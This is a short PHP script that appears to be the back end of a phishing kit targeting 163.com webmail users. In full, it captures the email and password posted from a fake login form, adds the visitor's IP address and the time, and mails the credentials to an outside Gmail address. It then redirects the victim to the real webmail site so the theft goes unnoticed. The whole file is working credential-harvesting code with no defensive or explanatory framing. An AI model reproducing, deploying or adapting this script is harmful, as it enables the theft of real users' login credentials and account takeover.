<?php

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");

$msg = "---------------------------------------------------------------------------\n";
$msg .= "New Login Info\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Email : ".$_POST['email']."\n";
$msg .= "Password : ".$_POST['pass']."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "---------------------------------------------------------------------------\n";

$to = "greenznation@gmail.com";
$subject = "New China Login $ip";
$from = "From: Login";

mail($to,$subject,$msg,$from);

header("Location: http://webmail.mail.163.com");


?>